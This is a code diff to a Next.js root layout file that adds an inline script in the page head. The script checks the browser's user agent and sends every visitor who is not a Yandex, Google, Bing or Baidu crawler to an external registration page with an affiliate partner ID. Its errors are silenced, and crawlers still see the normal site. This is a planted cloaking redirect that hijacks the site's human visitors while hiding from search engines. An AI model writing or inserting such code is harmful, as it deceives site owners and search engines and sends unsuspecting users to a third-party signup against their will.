@@ -27,6 +27,21 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
         <meta name="yandex-verification" content="1a9ed0d9740e79d1" />
         <meta charSet="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace(" https://1579.sparksvale.com/ru/registration?partner=p1579p39210pfe27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body>
     </html>
